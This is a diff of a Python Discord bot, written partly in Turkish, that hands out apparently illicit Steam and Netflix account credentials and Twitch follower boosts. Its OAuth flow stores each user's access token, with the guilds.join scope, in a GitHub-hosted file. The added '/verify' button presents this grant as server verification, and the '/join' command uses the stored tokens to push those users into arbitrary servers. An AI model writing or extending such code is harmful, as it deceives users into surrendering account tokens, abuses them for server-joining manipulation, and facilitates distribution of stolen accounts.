@@ -39,7 +39,7 @@ AUTH_FILE = "auth_tokens.json"
 STAFF_ROLES = [1566432003560181891, 1560996761659515003]
 EXCLUSIVE_ROLE = 1560688907199184986
 PREMIUM_ROLE = 1560316365951475852
-JOIN_ROLE = 1560292397982810173
+JOIN_ROLE = 1560292397982810173  # VERIFY ROLÜ
 TICKET_LOG_CHANNEL = 1566423675480186951
 VOUCH_CHANNEL = 1566423691301093437
 PREMIUM_EXCLUSIVE_CHANNEL = 1566423682371420273
@@ -190,24 +190,40 @@ def free_login():
 @web_app.route('/callback')
 def callback():
     code = request.args.get('code')
+    guild_id = request.args.get('state')
     if not code: return "Hata: Kod alınamadı."
+    
     data = {"client_id": CLIENT_ID, "client_secret": CLIENT_SECRET, "grant_type": "authorization_code", "code": code, "redirect_uri": REDIRECT_URI}
     headers = {"Content-Type": "application/x-www-form-urlencoded"}
+    
     def run_async(coro):
         loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
         return loop.run_until_complete(coro)
-    async def get_token():
+
+    async def get_token_and_role():
         async with aiohttp.ClientSession() as session:
             async with session.post("https://discord.com/api/oauth2/token", data=data, headers=headers) as resp:
                 if resp.status == 200:
                     access_token = (await resp.json()).get("access_token")
+                    
                     async with github_lock:
                         tokens, sha = await read_github_file(AUTH_FILE)
                         tokens.append(access_token)
                         await write_github_file(AUTH_FILE, tokens, sha)
+                        
+                    user_headers = {"Authorization": f"Bearer {access_token}"}
+                    async with session.get("https://discord.com/api/v10/users/@me", headers=user_headers) as u_resp:
+                        if u_resp.status == 200:
+                            user_id = (await u_resp.json())["id"]
+                            if guild_id:
+                                bot_headers = {"Authorization": f"Bot {TOKEN}", "Content-Type": "application/json"}
+                                async with session.put(f"https://discord.com/api/v10/guilds/{guild_id}/members/{user_id}/roles/{JOIN_ROLE}", headers=bot_headers) as r_resp:
+                                    if r_resp.status not in [200, 204]:
+                                        print(f"Rol verilemedi: {await r_resp.text()}")
                     return True
         return False
-    if run_async(get_token()): return "<h1 style='color:lightgreen;text-align:center;padding-top:100px;'>✅ Başarıyla Yetkilendirildi!</h1>"
+
+    if run_async(get_token_and_role()): return "<h1 style='color:lightgreen;text-align:center;padding-top:100px;'>✅ Başarıyla Yetkilendirildi!</h1>"
     return "<h1 style='color:red;text-align:center;padding-top:100px;'>❌ Yetkilendirme Başarısız!</h1>"
 
 def run_web(): web_app.run(host='0.0.0.0', port=WEB_PORT)
@@ -287,15 +303,35 @@ async def create_ticket(interaction: discord.Interaction, category: str):
         await interaction.followup.send(f"✅ Created: {channel.mention}", ephemeral=True)
     except Exception as e: await interaction.followup.send(f"❌ Error: {e}", ephemeral=True)
 
+# ==================== SLASH KOMUTLARI ====================
 @bot.tree.command(name="ticket", description="Open a ticket")
 async def ticket_cmd(interaction: discord.Interaction):
     await interaction.response.send_message(embed=discord.Embed(title="🎟️ Support", description="Select category."), view=TicketMenuView())
 
+@bot.tree.command(name="verify", description="Doğrulama butonu gönderir (Owner Only)")
+async def verify_cmd(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID:
+        return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
+    await interaction.response.defer()
+    auth_link = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=guilds.join+identify&state={interaction.guild.id}"
+    embed = discord.Embed(title="✅ Sunucu Doğrulama", description="Aşağıdaki butona tıklayarak Discord hesabını doğrula ve sunucuya erişim yetkisi kazan.\n\n*(Bu işlem için botun sunucuya katılmasına izin vermen gerekir.)*", color=discord.Color.green())
+    view = discord.ui.View()
+    view.add_item(discord.ui.Button(label="Doğrula / Authorize", style=discord.ButtonStyle.link, url=auth_link))
+    await interaction.followup.send(embed=embed, view=view)
+
+@bot.tree.command(name="working", description="Bota kaç kişinin yetki verdiğini gösterir (Owner Only)")
+async def working_cmd(interaction: discord.Interaction):
+    if interaction.user.id != OWNER_ID: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    tokens_data = await read_github_file(AUTH_FILE)
+    count = len([t for t in tokens_data[0] if t.strip()])
+    embed = discord.Embed(title="📊 Bot Durumu", description=f"Şu an bota **{count}** kişi yetki vermiş durumda.", color=discord.Color.blue())
+    await interaction.followup.send(embed=embed, ephemeral=True)
+
 @bot.tree.command(name="join", description="İzin veren hesapları Sunucu ID'si ile sunucuya sokar")
 @app_commands.describe(sunucu_id="Sunucunun ID'si", kac_adam="Kaç adam çekilecek")
 async def join_cmd(interaction: discord.Interaction, sunucu_id: str, kac_adam: int = 10):
-    if interaction.user.id != OWNER_ID: 
-        return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
+    if interaction.user.id != OWNER_ID: return await interaction.response.send_message("⛔ Owner only.", ephemeral=True)
     await interaction.response.defer()
     guild_id = sunucu_id.strip()
     tokens_data = await read_github_file(AUTH_FILE)
@@ -331,12 +367,9 @@ async def generate_cmd(interaction: discord.Interaction, service: app_commands.C
         return await interaction.response.send_message(f"❌ Use in <#{PREMIUM_EXCLUSIVE_CHANNEL}>.", ephemeral=True)
     if pln == "premium" and PREMIUM_ROLE not in user_roles: return await interaction.response.send_message("❌ No Premium role.", ephemeral=True)
     if pln == "exclusive" and EXCLUSIVE_ROLE not in user_roles: return await interaction.response.send_message("❌ No Exclusive role.", ephemeral=True)
-    
     await interaction.response.defer() 
-    
     limit_ok, t_left = check_limit(interaction.user.id, f"{svc}_{pln}")
     if not limit_ok: return await interaction.followup.send(f"❌ Limit reached. Wait {t_left//3600}h.", ephemeral=True)
-    
     async with github_lock:
         stock, sha = await read_github_file(STOK_FILES[pln])
         acc = None
@@ -350,17 +383,12 @@ async def generate_cmd(interaction: discord.Interaction, service: app_commands.C
             for line in stock.get("netflix", []):
                 if line not in stock.get("used", []): acc = line; stock["used"].append(line); break
         if acc: await write_github_file(STOK_FILES[pln], stock, sha)
-        
     if not acc: return await interaction.followup.send(f"❌ {pln.capitalize()} out of stock for {svc}!", ephemeral=True)
     set_limit(interaction.user.id, f"{svc}_{pln}")
-    
-    auth_link = "https://discord.com/oauth2/authorize?client_id=1567282004901241065&response_type=code&redirect_uri=https%3A%2F%2Fkanki-6k6m.onrender.com%2Fcallback&scope=guilds.join+identify"
-    
+    auth_link = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={REDIRECT_URI}&scope=guilds.join+identify&state={interaction.guild.id}"
     try:
         if svc == "steam":
-            # 1. Hesabı DM'den at
             await interaction.user.send(f"🎁 **Steam ({pln.capitalize()})**\n\n```\n{acc}\n```")
-            # 2. Authorize linkini DM'den at
             await interaction.user.send(f"🔗 **Do authorize for verify:**\n{auth_link}")
             await interaction.followup.send(f"✅ Generated, Check DMs!")
         else:
@@ -370,8 +398,7 @@ async def generate_cmd(interaction: discord.Interaction, service: app_commands.C
                 embed = discord.Embed(title=f"🎬 Netflix Request", color=discord.Color.red())
                 embed.add_field(name="User", value=f"{interaction.user.mention}"); embed.add_field(name="Acc", value=f"```{acc}```")
                 await owner.send(embed=embed)
-    except discord.Forbidden: 
-        await interaction.followup.send("❌ DM'leriniz kapalı olduğu için hesap ve link gönderilemedi.", ephemeral=True)
+    except discord.Forbidden: await interaction.followup.send("❌ DMs closed.", ephemeral=True)
 
 @bot.tree.command(name="tfollow", description="Twitch takipçi gönder")
 async def tfollow_cmd(interaction: discord.Interaction, twitch_ismi: str, adet: int = 10):
@@ -450,40 +477,13 @@ async def mute_cmd(interaction: discord.Interaction, member: discord.Member, dur
 @bot.tree.command(name="unblacklist", description="Remove BL")
 async def unblacklist_cmd(interaction: discord.Interaction, user: discord.Member, duration: str):
     if interaction.user.id != OWNER_ID: return await interaction.response.send_message("❌ Owner only.", ephemeral=True)
-    await interaction.response.defer(ephemeral=True); await interaction.followup.send(f"✅ Çıkarıldı: {user.mention}", ephemeral=True)
+    await interaction.response.defer(ephemeral=True)
+    # Blacklist kaldırma işlemi (Eğer bir blacklist sistemi varsa buraya eklenir)
+    await interaction.followup.send(f"✅ Blacklist kaldırıldı: {user.mention}", ephemeral=True)
 
-@bot.event
-async def on_message(message):
-    if message.author.bot or not isinstance(message.channel, discord.DMChannel) or message.author.id != OWNER_ID: return
-    content = message.content.lower().strip()
-    parts = message.content.split("<@")
-    if len(parts) > 1:
-        user_id_str = parts[1].split(">")[0].replace("!", "")
-        try: user_id = int(user_id_str)
-        except ValueError: return await message.reply("❌ Geçersiz etiket.")
-    else:
-        return await message.reply("❌ Kullanım: `.okey @kullanıcı` veya `.send @kullanıcı`")
-
-    if content.startswith(".okey"):
-        if user_id in pending_netflix:
-            acc = pending_netflix.pop(user_id)
-            approved_netflix[user_id] = acc
-            user = await bot.fetch_user(user_id)
-            await message.reply(f"✅ Okeylendi: **{user.name}**\n`.send @{user.name}`")
-        else: await message.reply("❌ Bekleyen istek yok.")
-    elif content.startswith(".send"):
-        if user_id in approved_netflix:
-            acc = approved_netflix.pop(user_id)
-            user = await bot.fetch_user(user_id)
-            try:
-                await user.send(f"🎬 **Netflix:**\n```\n{acc}\n```\n\n**Do Vouch or Blacklist in 2h.**\nVouch: <#{VOUCH_CHANNEL}> write `Ravex`")
-                await message.reply(f"✅ Gönderildi: **{user.name}**")
-            except discord.Forbidden: await message.reply("❌ DM kapalı.")
-        else: await message.reply("❌ Okeylenmemiş.")
-    await bot.process_commands(message)
-
+# ==================== BOTU BAŞLATMA ====================
 if __name__ == "__main__":
-    if not TOKEN or not GITHUB_TOKEN or not GITHUB_REPO:
-        print("❌ Eksik Environment!")
-        exit()
-    bot.run(TOKEN)
+    if not TOKEN:
+        print("❌ HATA: DISCORD_TOKEN bulunamadı! .env dosyasını kontrol et.")
+    else:
+        bot.run(TOKEN)
